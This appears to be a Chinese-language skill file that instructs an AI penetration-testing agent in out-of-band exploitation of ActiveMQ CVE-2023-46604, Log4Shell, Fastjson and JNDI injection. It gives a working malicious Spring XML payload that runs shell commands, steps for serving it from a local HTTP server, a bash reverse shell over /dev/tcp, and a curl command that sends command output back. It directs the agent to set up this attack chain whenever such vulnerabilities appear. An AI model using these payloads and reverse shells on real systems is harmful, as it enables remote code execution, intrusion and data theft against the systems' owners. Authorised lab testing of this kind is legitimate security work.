---
name: oob
description: 针对需要 OOB (Out-of-Band) 外带通信、反序列化拉取配置、JNDI 注入、SSRF 回连等特定网络拓扑的漏洞利用。当目标是 ActiveMQ, Log4Shell, Fastjson, Weblogic 等需要目标主动发起外部请求时加载此技能。触发词：oob, out-of-band, ssrf callback, reverse shell, jndi, activemq, 反序列化外带。
allowed-tools: Bash, Write, Python
---

# Out-of-Band (OOB) 与外带通信利用技巧

当你在测试特定漏洞（如 **CVE-2023-46604 (ActiveMQ)**，**Log4Shell (CVE-2021-44228)**，**Fastjson 反序列化**，**JNDI 注入** 等）时，单纯向目标发送指令是不够的。这些漏洞的特性要求**目标服务器主动向外发起请求（HTTP/LDAP/RMI）去下载恶意配置文件或类文件**。这就构成了 OOB (Out-of-Band) 利用链。

如果识别到此类漏洞，你**必须**在你的执行沙箱（如 Kali 容器）中搭建一个临时的服务，让靶机来访问你。

## OOB 漏洞利用完整闭环（标准流程）

1. **确定执行环境的网络联通性**：
   - 查看你当前的局域网 IP（例如通过执行 `hostname -i` 或 `curl ifconfig.me`，在 Docker 网络中通常类似于 `172.x.x.x`）。
   - 目标（如 `host.docker.internal` 或者是同一网段的容器）默认能够访问到你的这个 IP。

2. **在本地生成恶意的配置文件 / Payload 文件**：
   - 例如对于 CVE-2023-46604，你需要把恶意的 `poc.xml` 文件写在当前的目录下。
   ```bash
   cat << 'EOF' > poc.xml
   <?xml version="1.0" encoding="UTF-8"?>
   <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
       <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
           <constructor-arg>
               <list>
                   <value>/bin/sh</value><value>-c</value><value>ping -c 3 {{YOUR_IP}}</value>
               </list>
           </constructor-arg>
       </bean>
   </beans>
   EOF
   ```

3. **在后台启动临时 HTTP / FTP 服务**：
   - 使用 Python 快速起一个后台服务。确保在执行 PoC 前已经启动。
   ```python
   import os
   # 在对应目录启动 8080 端口 HTTP 服务
   os.system("nohup python3 -m http.server 8080 > /tmp/http.log 2>&1 &")
   ```

4. **构造主请求打向目标，触发靶机回连**：
   - 在你的 PoC 或注入包里，将 URL 写成你**刚刚起好的本地 HTTP 服务地址**（例如 `http://172.18.0.3:8080/poc.xml`），而不是无法访问的 `http://evil.com/poc.xml`。
   - 靶机收到请求后，解析你的包，发现内部有 URL，靶机会主动发起 HTTP GET 请求到你的 `172.18.0.3:8080`，下载并执行 `poc.xml`，漏洞利用链至此闭环！

5. **如果必须盲打（验证外带）**：
   - 如果环境极其严格，不知道自身 IP 或者回连端口被封，可以使用公共的 DNSLog 工具 或你搭建好的简易监听器。
   - `curl http://{{盲打平台标识}}.ceye.io/` 
   - 但能起本地 HTTP 服务首选本地 Web 服务拉取 Payload。

## 典型漏洞适配场景

### 1. ActiveMQ (CVE-2023-46604)
你需要靶机获取 `ClassPathXmlApplicationContext`。
**错误做法**：在 payload 填入 `http://evil.com/poc.xml`。
**正确做法**：写入本地 `poc.xml`，在后台跑 `python3 -m http.server 8080 &`，找到本机 IP 比如 `192.168.0.2`，在触发包里填入 `http://192.168.0.2:8080/poc.xml`，最后向目标的 `61616` 端口发 OpenWire 包。

### 2. Log4j2 (CVE-2021-44228)
你需要目标发起 JNDI LDAP 查询。
必须要下载类似 `JNDI-Exploit-Kit` 或使用特定的 JNDI 服务端在本地监听 `1389` 端口并提供 `Exploit.class`。

### 3. 反弹 Shell (Reverse Shell) (无外网 IP 时)
当 RCE 的命令没有回显时（例如靶机无响应体），不要尝试一直盲猜 `id`，直接让靶机把信息发给你。
先在本地开监听：
```python
import os
os.system("nohup nc -lvp 4444 > /tmp/nc_out.log 2>&1 &")
```
然后 RCE 盲打执行命令：
```bash
/bin/bash -c 'bash -i >& /dev/tcp/{{YOUR_IP}}/4444 0>&1'
# 或者是更简单的回送命令结果
curl http://{{YOUR_IP}}:8080/?data=$(whoami | base64)
```
再读取本地 `/tmp/nc_out.log` 或 HTTP 服务的 `/tmp/http.log` 即可获取回显的敏感信息！

## 总结：黄金准则
当你看到 “反序列化”、“加载外部配置”、“JNDI”、“OpenWire”、“请求外部类” 这些词汇时，立刻反应：
**1) 查沙箱 IP -> 2) 写恶意文件 -> 3) 起本地 HTTP/TCP Server 后台监听 -> 4) 把恶意包含我们 IP 的包打向靶机 -> 5) 等待靶机上钩。**
